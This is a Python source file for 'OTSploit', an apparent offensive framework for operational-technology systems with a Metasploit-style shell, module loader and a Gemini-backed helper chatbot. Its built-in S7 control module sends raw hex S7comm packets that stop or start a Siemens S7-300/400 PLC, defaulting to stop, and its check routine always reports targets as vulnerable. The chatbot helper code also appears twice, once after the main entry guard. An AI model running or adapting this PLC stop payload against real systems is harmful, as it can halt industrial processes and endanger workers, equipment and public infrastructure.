#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Standalone OTSploit framework with dynamic module discovery.

This version avoids importing the original package internals directly and
provides a compatibility shim so that modules under `OTSploit/modules/**`
can be discovered, imported, listed, and executed from this single entrypoint.
"""

import argparse
import configparser
import os
import sys
import socket
import time
import binascii
from termcolor import colored
from tabulate import tabulate
import importlib
import importlib.util
import types
import traceback
import requests
import json
import re

class OTSploitException(Exception):
    """Custom exception for OTSploit errors."""
    pass

def print_info(*args, **kwargs):
    """Print informational message."""
    print(colored(' '.join(map(str, args)), 'white'), **kwargs)

def print_success(*args, **kwargs):
    """Print success message."""
    print(colored(' '.join(map(str, args)), 'green'), **kwargs)

def print_error(*args, **kwargs):
    """Print error message."""
    print(colored(' '.join(map(str, args)), 'red'), file=sys.stderr, **kwargs)

def print_status(*args, **kwargs):
    """Print status message."""
    print(colored(' '.join(map(str, args)), 'blue'), **kwargs)

from weakref import WeakKeyDictionary

class Option:
    """Exploit attribute that is set by the end user (descriptor)."""
    def __init__(self, default, description="", validators=()):
        self.default = default
        self.description = description
        self.validators = validators if isinstance(validators, (tuple, list)) else ((validators,) if validators else ())
        self.label = None
        self._data = WeakKeyDictionary()

    def __get__(self, instance, owner):
        if instance is None:
            return self
        if instance in self._data:
            return self._data[instance]
        return self.default

    def __set__(self, instance, value):
        v = value
        for validator in self.validators:
            if not validator:
                continue
            v = validator(v)
        self._data[instance] = v

class Exploit:
    """Base class for exploits with Option aggregation."""
    exploit_attributes = {}

    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        attrs = {}
        for name, value in cls.__dict__.items():
            if isinstance(value, Option):
                value.label = name
                attrs[name] = value.description
        # support __info__ → _ClassName__info__ (some modules expect this)
        if '__info__' in cls.__dict__ and isinstance(cls.__dict__['__info__'], dict):
            setattr(cls, f"_{cls.__name__}__info__", cls.__dict__['__info__'])
            delattr(cls, '__info__')
        cls.exploit_attributes = attrs

    def run(self):
        raise NotImplementedError("You have to define your own 'run' method.")

    def check(self):
        raise NotImplementedError("You have to define your own 'check' method.")

# --- Compatibility shim for original OTSploit imports used by modules ---

def _ipv4(value):
    parts = str(value).split('.')
    if len(parts) != 4:
        raise ValueError("Invalid IPv4 address: must have 4 octets")
    for part in parts:
        num = int(part)
        if num < 0 or num > 255:
            raise ValueError(f"Invalid IPv4 address: {value}")
    return value

def _url(value):
    # Very simple URL validator; modules mainly need basic guard
    if not (str(value).startswith('http://') or str(value).startswith('https://')):
        raise ValueError(f"Invalid URL: {value}")
    return value

def _integer(value):
    return int(value)

def _ipv4_or_url(value):
    try:
        return _ipv4(value)
    except Exception:
        return _url(value)

def _string(value):
    return str(value)

def mute(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception:
            return None
    return wrapper

GLOBAL_OPTS = {}

def _make_shim_modules():
    """Create shim modules to satisfy imports inside discovered modules."""
    # OTSploit.exploits shim
    exploits_mod = types.ModuleType('OTSploit.exploits')
    exploits_mod.Exploit = Exploit
    exploits_mod.Option = Option
    exploits_mod.GLOBAL_OPTS = GLOBAL_OPTS

    # OTSploit.utils shim
    utils_mod = types.ModuleType('OTSploit.utils')
    # printing and helpers
    utils_mod.OTSploitException = OTSploitException
    utils_mod.print_info = print_info
    utils_mod.print_success = print_success
    utils_mod.print_error = print_error
    utils_mod.print_status = print_status
    # validators
    utils_mod.ipv4 = _ipv4
    utils_mod.url = _url
    utils_mod.integer = _integer
    utils_mod.ipv4_or_url = _ipv4_or_url
    utils_mod.string = _string
    # decorators/utility
    utils_mod.mute = mute

    # Top-level OTSploit shim exposing names some modules import from package root
    top = types.ModuleType('OTSploit')
    # Mark as a package so submodule imports work
    try:
        top.__path__ = [os.path.join(os.getcwd(), 'OTSploit')]
    except Exception:
        top.__path__ = []
    # Some modules use: from OTSploit import (exploits, print_success, ... validators, mute)
    top.exploits = exploits_mod
    top.print_info = print_info
    top.print_success = print_success
    top.print_error = print_error
    top.print_status = print_status
    top.mute = mute
    top.validators = utils_mod  # simple way to provide validators

    # Register in sys.modules so standard import mechanics find them
    sys.modules['OTSploit'] = top
    sys.modules['OTSploit.exploits'] = exploits_mod
    sys.modules['OTSploit.utils'] = utils_mod

    # Provide a package shim for OTSploit.modules to allow Python to
    # import actual files from the repository structure
    modules_pkg = types.ModuleType('OTSploit.modules')
    try:
        modules_pkg.__path__ = [os.path.join(os.getcwd(), 'OTSploit', 'modules')]
    except Exception:
        modules_pkg.__path__ = []
    sys.modules['OTSploit.modules'] = modules_pkg

    # Optional convenience shims for common subpackages
    exploits_pkg = types.ModuleType('OTSploit.modules.exploits')
    try:
        exploits_pkg.__path__ = [os.path.join(os.getcwd(), 'OTSploit', 'modules', 'exploits')]
    except Exception:
        exploits_pkg.__path__ = []
    sys.modules['OTSploit.modules.exploits'] = exploits_pkg

    scanners_pkg = types.ModuleType('OTSploit.modules.scanners')
    try:
        scanners_pkg.__path__ = [os.path.join(os.getcwd(), 'OTSploit', 'modules', 'scanners')]
    except Exception:
        scanners_pkg.__path__ = []
    sys.modules['OTSploit.modules.scanners'] = scanners_pkg

# Ensure shim modules are present before any dynamic import
_make_shim_modules()

class S7PLCControl(Exploit):
    """S7-300/400 PLC Control exploit."""
    
    def __init__(self):
        super().__init__()
        self.target = ""
        self.port = 102
        self.slot = 2
        self.command = 2
        self.sock = None

    def create_connect(self, slot):
        """Create connection to S7 PLC."""
        slot_num = chr(slot)
        create_connect_payload = binascii.unhexlify('0300001611e00000001400c1020100c20201') + slot_num.encode() + binascii.unhexlify('c0010a')
        self.sock.send(create_connect_payload)
        self.sock.recv(1024)
        setup_communication_payload = binascii.unhexlify('0300001902f08032010000020000080000f0000002000201e0')
        self.sock.send(setup_communication_payload)
        self.sock.recv(1024)

    def exploit(self):
        """Execute the exploit."""
        self.sock = socket.socket()
        self.sock.connect((self.target, self.port))
        self.create_connect(self.slot)
        
        if self.command == 1:
            print_status("Start plc")
            cpu_start_payload = binascii.unhexlify("0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d")
            self.sock.send(cpu_start_payload)
        elif self.command == 2:
            print_status("Stop plc")
            cpu_stop_payload = binascii.unhexlify("0300002102f0803201000006000010000029000000000009505f50524f4752414d")
            self.sock.send(cpu_stop_payload)
        else:
            print_error(f"Command {self.command} didn't support")

    def run(self):
        """Run the exploit."""
        if not self.target:
            print_error("Target not set. Use 'set target <ip>' first.")
            return
        
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target is down")
        else:
            print_error("Target is not alive")

    def check(self):
        """Check if target is vulnerable."""
        return True

    def _check_alive(self):
        """Check if target is alive."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
            return True
        except Exception:
            return False

class ModbusClient:
    """Modbus-TCP client for industrial devices."""
    
    def __init__(self, name="ModbusClient", ip="127.0.0.1", port=502):
        self.name = name
        self.ip = ip
        self.port = port
        self.sock = None
        self.connected = False
        self.transaction_id = 0
        
    def connect(self):
        """Connect to Modbus-TCP device."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.ip, self.port))
            self.connected = True
            print_success(f"Connected to {self.ip}:{self.port}")
            return True
        except Exception as e:
            print_error(f"Connection failed: {str(e)}")
            return False

class S7Client:
    """S7comm client for Siemens S7 PLCs."""
    
    def __init__(self, name="S7Client", ip="127.0.0.1", port=102, rack=0, slot=2):
        self.name = name
        self.ip = ip
        self.port = port
        self.rack = rack
        self.slot = slot
        self.sock = None
        self.connected = False
        
    def connect(self):
        """Connect to S7 PLC."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.ip, self.port))
            self.connected = True
            print_success(f"Connected to {self.ip}:{self.port}")
            return True
        except Exception as e:
            print_error(f"Connection failed: {str(e)}")
            return False

def show_help():
    """Show help information."""
    print_info("""
OTSploit - Operational Technology Exploitation Framework

Available Commands:
  help                    - Show this help
  list                    - List available modules
  use <module>            - Select a module
  set <option> <value>    - Set module option
  run                     - Run selected module
  check                   - Run module check() if available
  show options            - Show module options
  chatbot [ -q <text> ]   - ICS/OT mini chatbot (interactive or one-shot)
  exit                    - Exit framework

Available Modules:
  s7_control              - S7-300/400 PLC Control
  modbus_client           - Modbus-TCP Client
  s7_client               - S7comm Client
  s7_scan                 - S7comm Scanner (alias)
  profinet_scan           - Profinet DCP Scanner (alias)
  enip_scan               - ENIP Scanner (alias)

Example Usage:
  OTSploit > use s7_control
  OTSploit (S7 Control) > set target 192.168.1.100
  OTSploit (S7 Control) > set command 2
  OTSploit (S7 Control) > run
""")

def _discover_module_paths(base_dir='OTSploit/modules'):
    """Yield (python_module_path, kind) for all Exploit/Scanner modules in repo."""
    results = []
    for root, _, files in os.walk(base_dir):
        for file in files:
            if not file.endswith('.py') or file.startswith('__'):
                continue
            rel = os.path.join(root, file)[len('OTSploit/'):]  # modules/...
            py_mod = rel[:-3].replace(os.sep, '.')  # OTSploit.modules....
            py_mod = 'OTSploit.' + py_mod
            kind = 'scanner' if '.modules.scanners.' in py_mod else 'exploit'
            results.append((py_mod, kind))
    return sorted(results)

def _load_module_info(py_module_path):
    """Import module and extract display name/description if available."""
    try:
        mod = importlib.import_module(py_module_path)
        ExploitClass = getattr(mod, 'Exploit', None)
        info = {}
        if ExploitClass is not None:
            info_dict = getattr(ExploitClass, f"_{ExploitClass.__name__}__info__", None)
            if isinstance(info_dict, dict):
                info = info_dict
        name = info.get('name') or py_module_path.split('.')[-1]
        desc = info.get('description') or ''
        return name, desc, True
    except Exception:
        return py_module_path.split('.')[-1], 'Import error', False

def list_modules(discovered):
    """List built-ins and dynamically discovered modules with numeric indexes (pretty)."""
    import shutil
    termw = shutil.get_terminal_size((120, 20)).columns
    def trunc(s, maxlen):
        s = str(s) if s is not None else ''
        return s if len(s) <= maxlen else s[:maxlen-1] + '…'

    # dynamic width allocation
    max_id = max(28, min(56, int(termw * 0.28)))
    max_name = max(18, min(40, int(termw * 0.22)))
    max_desc = max(24, min(100, int(termw * 0.42)))

    rows = []
    # Built-ins
    builtins = [
        ("s7_control", "S7-300/400 PLC Control", "Control Siemens S7 PLCs", 'builtin', True),
        ("modbus_client", "Modbus-TCP Client", "Connect to Modbus devices", 'builtin', True),
        ("s7_client", "S7comm Client", "Connect to Siemens S7 PLCs", 'builtin', True),
        ("s7_scan", "S7comm Scanner (alias)", "Scan S7 devices (uses s7comm_scan)", 'builtin', True),
        ("profinet_scan", "Profinet DCP Scanner (alias)", "Discover Profinet devices (uses profinet_dcp_scan)", 'builtin', True),
        ("enip_scan", "ENIP Scanner (alias)", "Scan Ethernet/IP devices (uses enip_scan)", 'builtin', True),
    ]
    idx = 1
    for m in builtins:
        rows.append([
            idx,
            trunc(m[0], max_id),
            trunc(m[1], max_name),
            trunc(m[2], max_desc),
            m[3].title(),
            colored('OK', 'green') if m[4] else colored('ERR', 'red')
        ])
        idx += 1
    # Discovered
    for py_mod, kind in discovered:
        name, desc, ok = _load_module_info(py_mod)
        rows.append([
            idx,
            trunc(py_mod, max_id),
            trunc(name, max_name),
            trunc(desc, max_desc),
            kind.title(),
            colored('OK', 'green') if ok else colored('ERR', 'red')
        ])
        idx += 1

    print_info("\nAvailable Modules:")
    print(tabulate(
        rows,
        headers=["#", "Id/Path", "Name", "Description", "Type", "Status"],
        tablefmt="fancy_grid",
        colalign=("right", "left", "left", "left", "center", "center")
    ))
    return len(rows)

def show_module_options(module):
    """Show options for the current module."""
    if isinstance(module, S7PLCControl):
        options = [
            ("target", module.target, "Target IP address"),
            ("port", module.port, "Target port (default: 102)"),
            ("slot", module.slot, "CPU slot number (default: 2)"),
            ("command", module.command, "Command: 1=start, 2=stop"),
        ]
    elif isinstance(module, ModbusClient):
        options = [
            ("ip", module.ip, "Target IP address"),
            ("port", module.port, "Target port (default: 502)"),
        ]
    elif isinstance(module, S7Client):
        options = [
            ("ip", module.ip, "Target IP address"),
            ("port", module.port, "Target port (default: 102)"),
            ("rack", module.rack, "Rack number (default: 0)"),
            ("slot", module.slot, "Slot number (default: 2)"),
        ]
    else:
        print_error("Unknown module type")
        return
    
    print_info("\nModule Options:")
    print(tabulate(options, headers=["Option", "Current Value", "Description"], tablefmt="grid"))

# ------------------------- Chatbot helpers -------------------------

def _current_module_context(module):
    if not module:
        return {}
    ctx = {}
    try:
        attrs = getattr(module, 'exploit_attributes', {}) or {}
        for k in attrs.keys():
            try:
                ctx[k] = getattr(module, k)
            except Exception:
                pass
        # fallbacks
        for k in ["target", "ip", "rhost", "port", "rport", "lhost", "lport", "slot", "rack"]:
            if hasattr(module, k):
                try:
                    ctx[k] = getattr(module, k)
                except Exception:
                    pass
    except Exception:
        pass
    return ctx

def _chatbot_handle_query(query, api, module):
    ctx = _current_module_context(module)
    answers = []
    # NVD CVE quick lookup if CVE pattern present
    cve_match = re.findall(r"CVE-\d{4}-\d{4,7}", query, flags=re.I)
    if cve_match and api.get('nvd_key'):
        for cve in cve_match[:3]:
            try:
                r = requests.get(
                    "https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params={"cveId": cve},
                    headers={"apiKey": api['nvd_key']},
                    timeout=10,
                )
                if r.ok:
                    data = r.json()
                    items = data.get('vulnerabilities', [])
                    if items:
                        c = items[0].get('cve', {})
                        descs = c.get('descriptions', [])
                        desc = descs[0]['value'] if descs else ''
                        metrics = c.get('metrics', {})
                        cvss = ''
                        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                            if key in metrics and metrics[key]:
                                cvss = metrics[key][0].get('cvssData', {}).get('baseScore', '')
                                break
                        answers.append(f"{cve}: {desc} (CVSS: {cvss})")
            except Exception:
                pass

    # Serper search to enrich context
    serper_snippet = ''
    if api.get('serper_key'):
        try:
            sr = requests.post(
                "https://google.serper.dev/search",
                headers={"X-API-KEY": api['serper_key'], "Content-Type": "application/json"},
                data=json.dumps({"q": query, "num": 3}),
                timeout=10,
            )
            if sr.ok:
                sj = sr.json()
                results = sj.get('organic', [])[:3]
                serper_snippet = "\n".join([f"- {r.get('title','')} | {r.get('link','')}" for r in results if r])
        except Exception:
            pass

    # Gemini answer (fallback to heuristic if missing)
    final = None
    if api.get('gemini_key'):
        try:
            # Simple prompt; we avoid extra deps and use REST
            prompt = {
                "contents": [{
                    "parts": [{
                        "text": (
                            "You are an ICS/OT security assistant. Be concise.\n"
                            f"User question: {query}\n"
                            f"Current module context: {json.dumps(ctx)}\n"
                            f"Search hits:\n{serper_snippet}\n"
                        )
                    }]
                }]
            }
            gr = requests.post(
                f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={api['gemini_key']}",
                headers={"Content-Type": "application/json"},
                data=json.dumps(prompt),
                timeout=15,
            )
            if gr.ok:
                gj = gr.json()
                candidates = gj.get('candidates', [])
                if candidates:
                    parts = candidates[0].get('content', {}).get('parts', [])
                    if parts:
                        final = parts[0].get('text', '').strip()
        except Exception:
            pass

    if not final:
        # Heuristic fallback
        final = "\n".join(answers) if answers else "I can help with ICS/OT, CVEs, Siemens/Rockwell/Profinet/Modbus questions."

    print_info(final)
    return final

def main():
    """Main entry point for the standalone OTSploit framework."""
    print("""
                OT Exploitation Framework
Welcome ! Come Come
        """)
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description="OTSploit - Operational Technology Exploitation Framework",
        epilog="Example: python3 OTSploit_standalone.py"
    )
    parser.add_argument(
        '-e', '--extra-package-path',
        metavar='PATH',
        default='',
        help='Path to extra packages (not used in this version)'
    )
    
    args = parser.parse_args()
    
    # Load configuration
    isf_conf_file = "OTSploit.ini"
    isf_conf = configparser.ConfigParser(allow_no_value=True)
    
    try:
        if not isf_conf.read(isf_conf_file):
            print_info(f"Configuration file '{isf_conf_file}' not found. Using defaults.")
    except Exception as e:
        print_info(f"Error loading configuration: {e}")
    
    # Discover dynamic modules once at startup
    discovered_modules = _discover_module_paths()

    # Initialize framework
    current_module = None
    current_module_name = None
    current_module_origin = None  # builtin or python module path
    # API keys (prefer env, fallback config)
    api = {
        'gemini_key': os.getenv('GEMINI_API_KEY') or isf_conf.get('API', 'gemini_key', fallback=''),
        'serper_key': os.getenv('SERPER_API_KEY') or isf_conf.get('API', 'serper_key', fallback=''),
        'nvd_key': os.getenv('NVD_API_KEY') or isf_conf.get('API', 'nvd_key', fallback=''),
    }
    
    print_success("Framework initialized successfully!")
    print_info("Type 'help' for available commands or 'exit' to quit.")
    
    # Main command loop
    while True:
        try:
            if current_module:
                prompt = f"OTSploit ({current_module_name}) > "
            else:
                prompt = "OTSploit > "
            
            command = input(prompt).strip()
            
            if not command:
                continue
            
            parts = command.split()
            cmd = parts[0].lower()
            
            if cmd == "exit" or cmd == "quit":
                print_info("Thanks for staying with us. You can now close the tool.")
                break
            elif cmd == "help":
                show_help()
            elif cmd == "list":
                list_modules(discovered_modules)
            elif cmd == "chatbot":
                # one-shot mode
                if len(parts) >= 3 and parts[1] == '-q':
                    query = ' '.join(parts[2:]).strip()
                    if not query:
                        print_error("Usage: chatbot -q <question>")
                    else:
                        _chatbot_handle_query(query, api, current_module)
                    continue
                # interactive mode
                print_info("\nChatbot mode. Type 'back' to return. Type 'help' for tips.")
                while True:
                    try:
                        q = input("chatbot> ").strip()
                    except KeyboardInterrupt:
                        print_info("\nReturning to shell")
                        break
                    except EOFError:
                        print_info()
                        break
                    if not q:
                        continue
                    l = q.lower()
                    if l in ("back", "exit", "quit"):
                        break
                    if l == 'help':
                        print_info("Examples:")
                        print_info(" - CVE-2023-12345 impact on Siemens S7-1200?")
                        print_info(" - How to scan Profinet devices?")
                        print_info(" - Rockwell MicroLogix default ports?")
                        continue
                    _chatbot_handle_query(q, api, current_module)
            elif cmd == "use":
                if len(parts) < 2:
                    print_error("Usage: use <module>")
                    continue
                sel = parts[1]
                # Try numeric selection first
                selected = None
                try:
                    n = int(sel)
                    # 1..N across builtins then discovered
                    builtins_count = 3
                    if n <= 0:
                        raise ValueError
                    if n <= builtins_count:
                        selected = (['s7_control', 'modbus_client', 's7_client'][n-1], 'builtin')
                    else:
                        dm_index = n - builtins_count - 1
                        if 0 <= dm_index < len(discovered_modules):
                            selected = (discovered_modules[dm_index][0], 'dynamic')
                except ValueError:
                    pass

                module_name = None
                if selected is None:
                    module_name = sel
                else:
                    module_name = selected[0]

                if module_name == "s7_control":
                    current_module = S7PLCControl()
                    current_module_name = "S7 Control"
                    current_module_origin = 'builtin'
                    print_success(f"Using module: {current_module_name}")
                elif module_name == "modbus_client":
                    current_module = ModbusClient()
                    current_module_name = "Modbus Client"
                    current_module_origin = 'builtin'
                    print_success(f"Using module: {current_module_name}")
                elif module_name == "s7_client":
                    current_module = S7Client()
                    current_module_name = "S7 Client"
                    current_module_origin = 'builtin'
                    print_success(f"Using module: {current_module_name}")
                elif module_name == "s7_scan":
                    # alias to real module path if available
                    try:
                        mod = importlib.import_module('OTSploit.modules.scanners.s7comm_scan')
                        ExploitClass = getattr(mod, 'Exploit', None)
                        if ExploitClass is None:
                            raise OTSploitException('Exploit class not found in s7comm_scan')
                        current_module = ExploitClass()
                        current_module_name = "S7comm Scanner"
                        current_module_origin = 'OTSploit.modules.scanners.s7comm_scan'
                        print_success(f"Using module: {current_module_name}")
                    except Exception:
                        print_error("S7comm scanner not available")
                elif module_name == "profinet_scan":
                    try:
                        mod = importlib.import_module('OTSploit.modules.scanners.profinet_dcp_scan')
                        ExploitClass = getattr(mod, 'Exploit', None)
                        if ExploitClass is None:
                            raise OTSploitException('Exploit class not found in profinet_dcp_scan')
                        current_module = ExploitClass()
                        current_module_name = "Profinet DCP Scanner"
                        current_module_origin = 'OTSploit.modules.scanners.profinet_dcp_scan'
                        print_success(f"Using module: {current_module_name}")
                    except Exception:
                        print_error("Profinet DCP scanner not available")
                elif module_name == "enip_scan":
                    try:
                        mod = importlib.import_module('OTSploit.modules.scanners.enip_scan')
                        ExploitClass = getattr(mod, 'Exploit', None)
                        if ExploitClass is None:
                            raise OTSploitException('Exploit class not found in enip_scan')
                        current_module = ExploitClass()
                        current_module_name = "ENIP Scanner"
                        current_module_origin = 'OTSploit.modules.scanners.enip_scan'
                        print_success(f"Using module: {current_module_name}")
                    except Exception:
                        print_error("ENIP scanner not available")
                elif module_name.startswith('OTSploit.modules.'):
                    # Dynamic import of actual framework modules
                    try:
                        mod = importlib.import_module(module_name)
                        ExploitClass = getattr(mod, 'Exploit', None)
                        if ExploitClass is None:
                            raise OTSploitException('Exploit class not found in module')
                        current_module = ExploitClass()
                        # Try to fetch a friendly name
                        info_dict = getattr(ExploitClass, f"_{ExploitClass.__name__}__info__", {})
                        current_module_name = info_dict.get('name') or module_name.split('.')[-1]
                        current_module_origin = module_name
                        print_success(f"Using module: {current_module_name}")
                    except Exception as e:
                        print_error(f"Failed to load module: {module_name}")
                        print_error(traceback.format_exc())
                else:
                    print_error(f"Unknown module: {module_name}")
            elif cmd == "set":
                if not current_module:
                    print_error("No module selected. Use 'use <module>' first.")
                    continue
                
                if len(parts) < 3:
                    print_error("Usage: set <option> <value>")
                    continue
                
                option = parts[1]
                value = ' '.join(parts[2:])

                # Alias mapping to ease common names across modules
                alias_map = {
                    'lhost': ["lhost", "l_ip", "local_ip", "rev_ip", "callback_ip"],
                    'lport': ["lport", "l_port", "local_port", "rev_port", "callback_port"],
                    'rhost': ["rhost", "target", "ip", "host", "remote_ip"],
                    'rport': ["rport", "port", "remote_port"],
                    'target': ["target", "ip", "host", "rhost"],
                }

                def coerce(opt_name, val):
                    try:
                        if opt_name in ["port", "slot", "rack", "command", "timeout", "threads", "verbose",
                                        "min_rack", "max_rack", "min_slot", "max_slot", "lport", "rport"]:
                            return int(val)
                    except Exception:
                        pass
                    return val

                applied = False
                # Direct set
                if hasattr(current_module, option):
                    try:
                        setattr(current_module, option, coerce(option, value))
                        print_success(f"Set {option} = {value}")
                        applied = True
                    except Exception as e:
                        print_error(f"Failed to set option: {e}")
                        applied = False

                # Try aliases
                if not applied and option in alias_map:
                    for candidate in alias_map[option]:
                        if hasattr(current_module, candidate):
                            try:
                                setattr(current_module, candidate, coerce(candidate, value))
                                print_success(f"Set {candidate} = {value}")
                                applied = True
                                break
                            except Exception:
                                continue

                # Try exploit_attributes list
                if not applied:
                    try:
                        attrs = getattr(current_module, 'exploit_attributes', {}) or {}
                        if option in attrs:
                            setattr(current_module, option, coerce(option, value))
                            print_success(f"Set {option} = {value}")
                            applied = True
                    except Exception:
                        pass

                if not applied:
                    print_error(f"Unknown option: {option}")
            elif cmd == "show":
                if not current_module:
                    print_error("No module selected. Use 'use <module>' first.")
                    continue
                
                if len(parts) < 2:
                    print_error("Usage: show <options|info>")
                    continue
                
                subcmd = parts[1].lower()
                if subcmd == "options":
                    # Prefer module-defined show via metadata/options
                    headers = ["Option", "Current Value", "Description"]
                    rows = []
                    attrs = getattr(current_module, 'exploit_attributes', {}) or {}
                    if attrs:
                        for key, desc in attrs.items():
                            try:
                                val = getattr(current_module, key)
                            except Exception:
                                val = ''
                            rows.append([key, val, desc])
                        print_info("\nModule Options:")
                        print(tabulate(rows, headers=headers, tablefmt="grid"))
                    else:
                        # Fallback to dumping simple attributes
                        candid = []
                        for key in dir(current_module):
                            if key.startswith('_'):
                                continue
                            if callable(getattr(current_module, key)):
                                continue
                            try:
                                val = getattr(current_module, key)
                            except Exception:
                                continue
                            if isinstance(val, (str, int)):
                                candid.append([key, val, "(no description)"])
                        if candid:
                            print_info("\nModule Options (best-effort):")
                            print(tabulate(candid, headers=headers, tablefmt="grid"))
                        else:
                            show_module_options(current_module)
                else:
                    print_error(f"Unknown show command: {subcmd}")
            elif cmd == "check":
                if not current_module:
                    print_error("No module selected. Use 'use <module>' first.")
                    continue
                print_status("Checking target...")
                try:
                    res = current_module.check()
                    if res is True:
                        print_success("Target is vulnerable")
                    elif res is False:
                        print_info("Target is not vulnerable")
                    else:
                        print_info("Target could not be verified")
                except Exception as e:
                    print_error(f"Check failed: {str(e)}")
            elif cmd == "run":
                if not current_module:
                    print_error("No module selected. Use 'use <module>' first.")
                    continue
                
                # Summarize resolved options prior to run
                headers = ["Option", "Value"]
                rows = []
                attrs = getattr(current_module, 'exploit_attributes', {}) or {}
                if attrs:
                    for key in attrs.keys():
                        try:
                            val = getattr(current_module, key)
                        except Exception:
                            val = ''
                        rows.append([key, val])
                else:
                    for key in dir(current_module):
                        if key.startswith('_'):
                            continue
                        if callable(getattr(current_module, key)):
                            continue
                        try:
                            val = getattr(current_module, key)
                        except Exception:
                            continue
                        if isinstance(val, (str, int)):
                            rows.append([key, val])
                if rows:
                    print_info("\nResolved Options:")
                    print(tabulate(rows, headers=headers, tablefmt="grid"))

                # Basic sanity checks for common required fields
                missing = []
                for required in ["target", "ip", "rhost"]:
                    if hasattr(current_module, required):
                        try:
                            v = getattr(current_module, required)
                            if v is None or (isinstance(v, str) and v.strip() == ""):
                                missing.append(required)
                        except Exception:
                            pass
                if missing:
                    print_error(f"Missing required options: {', '.join(missing)}")
                    print_info("Set them with: set <option> <value>")
                    continue

                print_status("Running module...")
                try:
                    current_module.run()
                except KeyboardInterrupt:
                    print_info("\nInterrupted by user")
                except Exception as e:
                    print_error(f"Module execution failed: {str(e)}")
            elif cmd == "back":
                current_module = None
                current_module_name = None
                print_info("Deselected current module")
            else:
                print_error(f"Unknown command: {cmd}")
                print_info("Type 'help' for available commands")
                
        except KeyboardInterrupt:
            print_info("\nUse 'exit' to quit")
        except EOFError:
            print_info(" Thanks for staying with us. You can now close the tool.")
            break
        except Exception as e:
            print_error(f"Unexpected error: {str(e)}")

if __name__ == "__main__":
    main()

# ------------------------- Chatbot helpers -------------------------

def _current_module_context(module):
    if not module:
        return {}
    ctx = {}
    try:
        attrs = getattr(module, 'exploit_attributes', {}) or {}
        for k in attrs.keys():
            try:
                ctx[k] = getattr(module, k)
            except Exception:
                pass
        # fallbacks
        for k in ["target", "ip", "rhost", "port", "rport", "lhost", "lport", "slot", "rack"]:
            if hasattr(module, k):
                try:
                    ctx[k] = getattr(module, k)
                except Exception:
                    pass
    except Exception:
        pass
    return ctx

def _chatbot_handle_query(query, api, module):
    ctx = _current_module_context(module)
    answers = []
    # NVD CVE quick lookup if CVE pattern present
    cve_match = re.findall(r"CVE-\d{4}-\d{4,7}", query, flags=re.I)
    if cve_match and api.get('nvd_key'):
        for cve in cve_match[:3]:
            try:
                r = requests.get(
                    "https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params={"cveId": cve},
                    headers={"apiKey": api['nvd_key']},
                    timeout=10,
                )
                if r.ok:
                    data = r.json()
                    items = data.get('vulnerabilities', [])
                    if items:
                        c = items[0].get('cve', {})
                        descs = c.get('descriptions', [])
                        desc = descs[0]['value'] if descs else ''
                        metrics = c.get('metrics', {})
                        cvss = ''
                        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                            if key in metrics and metrics[key]:
                                cvss = metrics[key][0].get('cvssData', {}).get('baseScore', '')
                                break
                        answers.append(f"{cve}: {desc} (CVSS: {cvss})")
            except Exception:
                pass

    # Serper search to enrich context
    serper_snippet = ''
    if api.get('serper_key'):
        try:
            sr = requests.post(
                "https://google.serper.dev/search",
                headers={"X-API-KEY": api['serper_key'], "Content-Type": "application/json"},
                data=json.dumps({"q": query, "num": 3}),
                timeout=10,
            )
            if sr.ok:
                sj = sr.json()
                results = sj.get('organic', [])[:3]
                serper_snippet = "\n".join([f"- {r.get('title','')} | {r.get('link','')}" for r in results if r])
        except Exception:
            pass

    # Gemini answer (fallback to heuristic if missing)
    final = None
    if api.get('gemini_key'):
        try:
            # Simple prompt; we avoid extra deps and use REST
            prompt = {
                "contents": [{
                    "parts": [{
                        "text": (
                            "You are an ICS/OT security assistant. Be concise.\n"
                            f"User question: {query}\n"
                            f"Current module context: {json.dumps(ctx)}\n"
                            f"Search hits:\n{serper_snippet}\n"
                        )
                    }]
                }]
            }
            gr = requests.post(
                f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={api['gemini_key']}",
                headers={"Content-Type": "application/json"},
                data=json.dumps(prompt),
                timeout=15,
            )
            if gr.ok:
                gj = gr.json()
                candidates = gj.get('candidates', [])
                if candidates:
                    parts = candidates[0].get('content', {}).get('parts', [])
                    if parts:
                        final = parts[0].get('text', '').strip()
        except Exception:
            pass

    if not final:
        # Heuristic fallback
        final = "\n".join(answers) if answers else "I can help with ICS/OT, CVEs, Siemens/Rockwell/Profinet/Modbus questions."

    print_info(final)
    return final
